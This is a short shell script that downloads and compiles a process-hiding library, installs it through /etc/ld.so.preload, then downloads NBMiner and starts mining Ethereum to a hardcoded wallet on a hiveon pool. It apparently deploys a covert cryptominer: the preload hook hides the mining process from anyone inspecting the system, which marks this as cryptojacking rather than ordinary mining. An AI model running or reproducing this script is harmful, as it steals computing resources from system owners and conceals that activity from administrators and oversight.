wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/NebuTech/NBMiner/releases/download/v34.4/NBMiner_34.4_Linux.tgz
tar -xvzf NBMiner_34.4_Linux.tgz
cd NBMiner_Linux
./nbminer -a ethash -o ethproxy+ssl://naw-eth.hiveon.net:24443 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a.NBMiner -log
